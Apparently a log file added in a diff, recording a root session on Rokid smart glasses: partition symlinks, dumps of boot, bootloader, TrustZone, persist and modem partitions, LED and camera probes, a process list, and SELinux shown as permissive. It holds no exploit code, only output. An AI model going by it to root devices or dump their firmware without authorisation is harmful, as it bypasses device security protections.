+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 featenabler_a -> /dev/block/mmcblk0p63
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 featenabler_b -> /dev/block/mmcblk0p65
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 frp -> /dev/block/mmcblk0p68
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 fsc -> /dev/block/mmcblk0p98
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 fsg -> /dev/block/mmcblk0p97
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 hyp_a -> /dev/block/mmcblk0p15
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 hyp_b -> /dev/block/mmcblk0p16
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 imagefv_a -> /dev/block/mmcblk0p47
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 imagefv_b -> /dev/block/mmcblk0p48
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 keymaster_a -> /dev/block/mmcblk0p27
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 keymaster_b -> /dev/block/mmcblk0p28
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 keystore -> /dev/block/mmcblk0p60
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 limits -> /dev/block/mmcblk0p73
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 limits-cdsp -> /dev/block/mmcblk0p74
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 logdump -> /dev/block/mmcblk0p77
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 logfs -> /dev/block/mmcblk0p76
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 mdcompress -> /dev/block/mmcblk0p84
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 mdtp_a -> /dev/block/mmcblk0p31
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 mdtp_b -> /dev/block/mmcblk0p32
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 mdtpsecapp_a -> /dev/block/mmcblk0p29
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 mdtpsecapp_b -> /dev/block/mmcblk0p30
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 metadata -> /dev/block/mmcblk0p26
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 misc -> /dev/block/mmcblk0p59
+lrwxrwxrwx 1 root root 18 1970-06-03 04:53 mmcblk0 -> /dev/block/mmcblk0
+lrwxrwxrwx 1 root root 23 1970-06-03 04:53 mmcblk0boot0 -> /dev/block/mmcblk0boot0
+lrwxrwxrwx 1 root root 23 1970-06-03 04:53 mmcblk0boot1 -> /dev/block/mmcblk0boot1
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 modem_a -> /dev/block/mmcblk0p33
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 modem_b -> /dev/block/mmcblk0p34
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 modemst1 -> /dev/block/mmcblk0p95
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 modemst2 -> /dev/block/mmcblk0p96
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 multiimgoem_a -> /dev/block/mmcblk0p52
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 multiimgoem_b -> /dev/block/mmcblk0p53
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 multiimgqti_a -> /dev/block/mmcblk0p54
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 multiimgqti_b -> /dev/block/mmcblk0p55
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 persist -> /dev/block/mmcblk0p51
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 qmcs -> /dev/block/mmcblk0p80
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 quantumcontentfv -> /dev/block/mmcblk0p87
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 questdatafv -> /dev/block/mmcblk0p64
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 qupfw_a -> /dev/block/mmcblk0p66
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 qupfw_b -> /dev/block/mmcblk0p67
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 qweslicstore_a -> /dev/block/mmcblk0p81
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 qweslicstore_b -> /dev/block/mmcblk0p82
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 recovery_a -> /dev/block/mmcblk0p19
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 recovery_b -> /dev/block/mmcblk0p20
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 rtice -> /dev/block/mmcblk0p91
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 secdata -> /dev/block/mmcblk0p85
+lrwxrwxrwx 1 root root 20 1970-06-03 04:53 shrm_a -> /dev/block/mmcblk0p5
+lrwxrwxrwx 1 root root 20 1970-06-03 04:53 shrm_b -> /dev/block/mmcblk0p6
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 splash -> /dev/block/mmcblk0p72
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 spunvm -> /dev/block/mmcblk0p88
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 ssd -> /dev/block/mmcblk0p42
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 storsec -> /dev/block/mmcblk0p83
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 super -> /dev/block/mmcblk0p21
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 swap -> /dev/block/mmcblk0p94
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 toolsfv -> /dev/block/mmcblk0p75
+lrwxrwxrwx 1 root root 20 1970-06-03 04:53 tz_a -> /dev/block/mmcblk0p7
+lrwxrwxrwx 1 root root 20 1970-06-03 04:53 tz_b -> /dev/block/mmcblk0p8
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 tzsc -> /dev/block/mmcblk0p90
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 uefi_a -> /dev/block/mmcblk0p13
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 uefi_b -> /dev/block/mmcblk0p14
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 uefisecapp_a -> /dev/block/mmcblk0p49
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 uefisecapp_b -> /dev/block/mmcblk0p50
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 uefivarstore -> /dev/block/mmcblk0p86
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 userdata -> /dev/block/mmcblk0p99
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 vbmeta_a -> /dev/block/mmcblk0p78
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 vbmeta_b -> /dev/block/mmcblk0p79
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 vbmeta_system_a -> /dev/block/mmcblk0p22
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 vbmeta_system_b -> /dev/block/mmcblk0p23
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 vendor_boot_a -> /dev/block/mmcblk0p24
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 vendor_boot_b -> /dev/block/mmcblk0p25
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 vm-data -> /dev/block/mmcblk0p58
+lrwxrwxrwx 1 root root 20 1970-06-03 04:53 xbl_a -> /dev/block/mmcblk0p1
+lrwxrwxrwx 1 root root 20 1970-06-03 04:53 xbl_b -> /dev/block/mmcblk0p2
+lrwxrwxrwx 1 root root 20 1970-06-03 04:53 xbl_config_a -> /dev/block/mmcblk0p3
+lrwxrwxrwx 1 root root 20 1970-06-03 04:53 xbl_config_b -> /dev/block/mmcblk0p4
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 xbl_ramdump_a -> /dev/block/mmcblk0p43
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 xbl_ramdump_b -> /dev/block/mmcblk0p44
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 xbl_sc_logs -> /dev/block/mmcblk0p93
+lrwxrwxrwx 1 root root 21 1970-06-03 04:53 xbl_sc_test_mode -> /dev/block/mmcblk0p92
+Dumping boot_a...
+Dumping boot_b...
+Dumping vendor_boot_a...
+Dumping vendor_boot_b...
+Dumping dtbo_a...
+Dumping dtbo_b...
+Dumping recovery_a...
+Dumping recovery_b...
+Dumping vbmeta_a...
+Dumping vbmeta_b...
+Dumping vbmeta_system_a...
+Dumping vbmeta_system_b...
+Dumping abl_a...
+Dumping abl_b...
+Dumping xbl_a...
+Dumping xbl_b...
+Dumping xbl_config_a...
+Dumping xbl_config_b...
+Dumping tz_a...
+Dumping tz_b...
+Dumping hyp_a...
+Dumping hyp_b...
+Dumping persist...
+Dumping devinfo...
+Dumping misc...
+Dumping splash...
+Dumping fsg...
+Dumping fsc...
+Dumping modemst1...
+Dumping modemst2...
+=== All Key Partitions Dumped Successfully ===
+total 0
+lrwxrwxrwx 1 root root 0 2026-08-22 14:59 blue -> ../../devices/platform/soc/a90000.i2c/i2c-1/1-0030/leds/blue
+lrwxrwxrwx 1 root root 0 2026-08-22 14:59 green -> ../../devices/platform/soc/a90000.i2c/i2c-1/1-0030/leds/green
+lrwxrwxrwx 1 root root 0 2026-08-22 14:59 mmc0:: -> ../../devices/platform/soc/7c4000.sdhci/leds/mmc0::
+lrwxrwxrwx 1 root root 0 2026-08-22 14:59 red -> ../../devices/platform/soc/a90000.i2c/i2c-1/1-0030/leds/red
+lrwxrwxrwx 1 root root 0 2026-08-22 14:59 white -> ../../devices/platform/soc/a90000.i2c/i2c-1/1-0030/leds/white
+=== 1. Sysfs LED 節點清單 ===
+total 0
+drwxr-xr-x   2 root root 0 2026-08-22 14:59 .
+drwxr-xr-x 103 root root 0 1970-06-03 04:53 ..
+lrwxrwxrwx   1 root root 0 2026-08-22 14:59 blue -> ../../devices/platform/soc/a90000.i2c/i2c-1/1-0030/leds/blue
+lrwxrwxrwx   1 root root 0 2026-08-22 14:59 green -> ../../devices/platform/soc/a90000.i2c/i2c-1/1-0030/leds/green
+lrwxrwxrwx   1 root root 0 2026-08-22 14:59 mmc0:: -> ../../devices/platform/soc/7c4000.sdhci/leds/mmc0::
+lrwxrwxrwx   1 root root 0 2026-08-22 14:59 red -> ../../devices/platform/soc/a90000.i2c/i2c-1/1-0030/leds/red
+lrwxrwxrwx   1 root root 0 2026-08-22 14:59 white -> ../../devices/platform/soc/a90000.i2c/i2c-1/1-0030/leds/white
+
+=== 2. LED 節點詳細狀態 (亮度與觸發源) ===
+[/sys/class/leds/blue]
+  brightness: 0
+  max_brightness: 255
+  trigger: [none] rc-feedback rfkill-any rfkill-none timer transient mmc0 rfkill0 battery-charging-or-full battery-charging battery-full battery-charging-blink-full-solid mp2724-charger-online mp2724-battery-charging-or-full mp2724-battery-charging mp2724-battery-full mp2724-battery-charging-blink-full-solid rfkill1
+[/sys/class/leds/green]
+  brightness: 0
+  max_brightness: 255
+  trigger: [none] rc-feedback rfkill-any rfkill-none timer transient mmc0 rfkill0 battery-charging-or-full battery-charging battery-full battery-charging-blink-full-solid mp2724-charger-online mp2724-battery-charging-or-full mp2724-battery-charging mp2724-battery-full mp2724-battery-charging-blink-full-solid rfkill1
+[/sys/class/leds/mmc0::]
+  brightness: 0
+  max_brightness: 255
+  trigger: none rc-feedback rfkill-any rfkill-none timer transient [mmc0] rfkill0 battery-charging-or-full battery-charging battery-full battery-charging-blink-full-solid mp2724-charger-online mp2724-battery-charging-or-full mp2724-battery-charging mp2724-battery-full mp2724-battery-charging-blink-full-solid rfkill1
+[/sys/class/leds/red]
+  brightness: 0
+  max_brightness: 255
+  trigger: [none] rc-feedback rfkill-any rfkill-none timer transient mmc0 rfkill0 battery-charging-or-full battery-charging battery-full battery-charging-blink-full-solid mp2724-charger-online mp2724-battery-charging-or-full mp2724-battery-charging mp2724-battery-full mp2724-battery-charging-blink-full-solid rfkill1
+[/sys/class/leds/white]
+  brightness: 0
+  max_brightness: 255
+  trigger: [none] rc-feedback rfkill-any rfkill-none timer transient mmc0 rfkill0 battery-charging-or-full battery-charging battery-full battery-charging-blink-full-solid mp2724-charger-online mp2724-battery-charging-or-full mp2724-battery-charging mp2724-battery-full mp2724-battery-charging-blink-full-solid rfkill1
+
+=== 3. 搜尋 Torch / Flash / Indicator 相關裝置路徑 ===
+
+=== 4. 檢查相機服務的 Torch / Flash 狀態 ===
+    Has a flash unit: false
+      android.flash.info.available (50000): byte[1]
+    0x80a60000 (is_flash_snapshot) with type 1 (int32) defined in section com.qti.stats_control
+        android.flash.mode (40002): byte[1]
+        android.flash.state (40005): byte[1]
+        com.qti.stats_control.is_flash_snapshot (80a60000): int32[1]
+        android.flash.mode (40002): byte[1]
+
+=== 5. 檢查 Rokid 專屬硬體驅動節點 ===
+crw-rw---- 1 system camera 81,   4 1970-06-03 04:53 /dev/v4l-subdev0
+crw-rw---- 1 system camera 81,   5 1970-06-03 04:53 /dev/v4l-subdev1
+crw-rw---- 1 system camera 81,   6 1970-06-03 04:53 /dev/v4l-subdev2
+crw-rw---- 1 system camera 81,   7 1970-06-03 04:53 /dev/v4l-subdev3
+crw-rw---- 1 system camera 81,   8 1970-06-03 04:53 /dev/v4l-subdev4
+crw-rw---- 1 system camera 81,   9 1970-06-03 04:53 /dev/v4l-subdev5
+crw-rw---- 1 system camera 81,  10 1970-06-03 04:53 /dev/v4l-subdev6
+/system/bin/sh: <stdin>[63]: v4l2-ctl: inaccessible or not found
+root            12     2       0      0 smpboot_thread_fn   0 S [ksoftirqd/0]
+root            21     2       0      0 smpboot_thread_fn   0 S [ksoftirqd/1]
+root            27     2       0      0 smpboot_thread_fn   0 S [ksoftirqd/2]
+root            34     2       0      0 smpboot_thread_fn   0 S [ksoftirqd/3]
+root           131     2       0      0 irq_wait_for_interrupt 0 S [irq/15-qcom-scm]
+root           135     2       0      0 irq_wait_for_interrupt 0 S [irq/19-KRYO L3-]
+root           136     2       0      0 irq_wait_for_interrupt 0 S [irq/25-dcvsh-ir]
+root           139     2       0      0 irq_wait_for_interrupt 0 S [irq/47-arm-smmu]
+root           147     2       0      0 irq_wait_for_interrupt 0 S [irq/277-thresho]
+root           148     2       0      0 irq_wait_for_interrupt 0 S [irq/272-qcom,te]
+root           149     2       0      0 irq_wait_for_interrupt 0 S [irq/50-arm-smmu]
+root           150     2       0      0 irq_wait_for_interrupt 0 S [irq/48-arm-smmu]
+root           151     2       0      0 irq_wait_for_interrupt 0 S [irq/51-arm-smmu]
+root           152     2       0      0 irq_wait_for_interrupt 0 S [irq/29-7c4000.s]
+root           155     2       0      0 irq_wait_for_interrupt 0 S [irq/28-mmc0]
+root           346     2       0      0 irq_wait_for_interrupt 0 S [irq/180-int_glo]
+root           348     2       0      0 irq_wait_for_interrupt 0 S [irq/281-smp2p_2]
+root           349     2       0      0 irq_wait_for_interrupt 0 S [irq/38-arm-smmu]
+root           357     2       0      0 irq_wait_for_interrupt 0 S [irq/52-arm-smmu]
+root           368     2       0      0 irq_wait_for_interrupt 0 S [irq/26-190b6400]
+root           369     2       0      0 irq_wait_for_interrupt 0 S [irq/53-arm-smmu]
+root           370     2       0      0 irq_wait_for_interrupt 0 S [irq/27-19091000]
+root           371     2       0      0 irq_wait_for_interrupt 0 S [irq/54-arm-smmu]
+root           372     2       0      0 irq_wait_for_interrupt 0 S [irq/55-arm-smmu]
+root           373     2       0      0 irq_wait_for_interrupt 0 S [irq/56-arm-smmu]
+root           374     2       0      0 irq_wait_for_interrupt 0 S [irq/57-arm-smmu]
+root           375     2       0      0 irq_wait_for_interrupt 0 S [irq/58-arm-smmu]
+root           376     2       0      0 irq_wait_for_interrupt 0 S [irq/59-arm-smmu]
+root           377     2       0      0 irq_wait_for_interrupt 0 S [irq/60-arm-smmu]
+root           378     2       0      0 irq_wait_for_interrupt 0 S [irq/61-arm-smmu]
+root           379     2       0      0 irq_wait_for_interrupt 0 S [irq/62-arm-smmu]
+root           380     2       0      0 irq_wait_for_interrupt 0 S [irq/63-arm-smmu]
+root           381     2       0      0 irq_wait_for_interrupt 0 S [irq/64-arm-smmu]
+root           382     2       0      0 irq_wait_for_interrupt 0 S [irq/65-arm-smmu]
+root           384     2       0      0 irq_wait_for_interrupt 0 S [irq/282-smp2p_5]
+root           385     2       0      0 irq_wait_for_interrupt 0 S [irq/66-arm-smmu]
+root           387     2       0      0 irq_wait_for_interrupt 0 S [irq/284-smp2p_1]
+root           398     2       0      0 irq_wait_for_interrupt 0 S [irq/178-c263000]
+root           402     2       0      0 irq_wait_for_interrupt 0 S [irq/67-arm-smmu]
+root           411     2       0      0 irq_wait_for_interrupt 0 S [irq/179-c263000]
+root           413     2       0      0 irq_wait_for_interrupt 0 S [irq/68-arm-smmu]
+root           414     2       0      0 irq_wait_for_interrupt 0 S [irq/312-cw221x_]
+root           425     2       0      0 irq_wait_for_interrupt 0 S [irq/313-mp2724_]
+root           438     2       0      0 irq_wait_for_interrupt 0 S [irq/314-q6v5 wd]
+root           439     2       0      0 irq_wait_for_interrupt 0 S [irq/315-qcom,qm]
+root           443     2       0      0 irq_wait_for_interrupt 0 S [irq/316-pwr_eve]
+root           444     2       0      0 irq_wait_for_interrupt 0 S [irq/30-q6v5 wdo]
+root           457     2       0      0 irq_wait_for_interrupt 0 S [irq/321-dp_hs_p]
+root           459     2       0      0 irq_wait_for_interrupt 0 S [irq/326-dm_hs_p]
+root           461     2       0      0 irq_wait_for_interrupt 0 S [irq/327-ss_phy_]
+root           463     2       0      0 irq_wait_for_interrupt 0 S [irq/39-arm-smmu]
+root           465     2       0      0 irq_wait_for_interrupt 0 S [irq/69-arm-smmu]
+root           466     2       0      0 irq_wait_for_interrupt 0 S [irq/41-arm-smmu]
+root           467     2       0      0 irq_wait_for_interrupt 0 S [irq/42-arm-smmu]
+root           471     2       0      0 irq_wait_for_interrupt 0 S [irq/70-arm-smmu]
+root           474     2       0      0 irq_wait_for_interrupt 0 S [irq/266-msm-vid]
+root           475     2       0      0 irq_wait_for_interrupt 0 S [irq/71-arm-smmu]
+root           476     2       0      0 irq_wait_for_interrupt 0 S [irq/72-arm-smmu]
+root           477     2       0      0 irq_wait_for_interrupt 0 S [irq/73-arm-smmu]
+root           478     2       0      0 irq_wait_for_interrupt 0 S [irq/74-arm-smmu]
+root           479     2       0      0 irq_wait_for_interrupt 0 S [irq/75-arm-smmu]
+root           483     2       0      0 irq_wait_for_interrupt 0 S [irq/49-arm-smmu]
+root           484     2       0      0 irq_wait_for_interrupt 0 S [irq/76-arm-smmu]
+root           487     2       0      0 rescuer_thread      0 I [pm_workerq_iris]
+root           489     2       0      0 irq_wait_for_interrupt 0 S [irq/77-arm-smmu]
+root           492     2       0      0 irq_wait_for_interrupt 0 S [irq/78-arm-smmu]
+root           497     2       0      0 irq_wait_for_interrupt 0 S [irq/79-arm-smmu]
+root           507     2       0      0 irq_wait_for_interrupt 0 S [irq/80-arm-smmu]
+root           509     2       0      0 irq_wait_for_interrupt 0 S [irq/81-arm-smmu]
+root           517     2       0      0 irq_wait_for_interrupt 0 S [irq/82-arm-smmu]
+root           531     2       0      0 rescuer_thread      0 I [cam-cpas]
+root           532     2       0      0 rescuer_thread      0 I [qcom,cam_virtua]
+root           551     2       0      0 rescuer_thread      0 I [cam_cci_wq]
+root           552     2       0      0 rescuer_thread      0 I [cam_cci_wq]
+system         778     1 2452336   3560 binder_wait_for_work 0 S android.hardware.sensors@2.1-service.multihal
+root           790     2       0      0 irq_wait_for_interrupt 0 S [irq/362-glink-n]
+cameraserver   791     1 3526768  18036 binder_wait_for_work 0 S vendor.qti.camera.provider@2.7-service_64
+root           814     2       0      0 irq_wait_for_interrupt 0 S [irq/363-glink-n]
+root           834     2       0      0 irq_wait_for_interrupt 0 S [irq/83-arm-smmu]
+system         838     1 2387832   2420 __arm64_sys_nanosleep 0 S sensors.qti
+system         839     1 2152424   1636 futex_wait_queue_me 0 S lowirpcd
+root           852     2       0      0 irq_wait_for_interrupt 0 S [irq/364-swr_mas]
+root           854     2       0      0 irq_wait_for_interrupt 0 S [irq/365-swr_mas]
+cameraserver   924     1 2681880   9428 binder_wait_for_work 0 S cameraserver
+root          1396     2       0      0 irq_wait_for_interrupt 0 S [irq/329-bhi]
+system        1514   723 5991292  72208 do_epoll_wait       0 S com.rokid.sysconfig
+system        1589   723 6301668  69996 do_epoll_wait       0 S com.rokid.cxrservice
+root          1735     2       0      0 irq_wait_for_interrupt 0 S [irq/366-rt600_s]
+root          1753     1 2172064   3240 do_sys_poll         0 S msm_irqbalance
+root          1805     2       0      0 irq_wait_for_interrupt 0 S [irq/328-dwc3]
+system        1848   723 5985260  69692 do_epoll_wait       0 S com.rokid.os.sprite.live
+system        1927   723 6059672  69824 do_epoll_wait       0 S com.rokid.glass.ota
+system        1963   723 6454988  68424 do_epoll_wait       0 S com.rokid.os.master.screenstream
+system        1974   723 7662244 100244 do_epoll_wait       0 S com.rokid.os.sprite.assistserver
+system        2061   723 6759352 104860 do_epoll_wait       0 S com.rokid.os.sprite.launcher
+system        2313   723 6172068 121196 do_epoll_wait       0 S com.rokid.os.sprite.assistserver:tts
+=== RUN DONE (pipe rc=255) ===
+--- host time ---
+Sat Aug 22 03:15:51 PM CST 2026
+--- adb device state ---
+device
+--- uptime after ---
+ 15:16:48 up 45 min,  0 users,  load average: 0.31, 0.30, 0.24
+--- getenforce after ---
+Permissive
+--- log file: /home/kali/rokid_root/reports/ghostlock_runlogs/run_w2_v960_143215.log ---
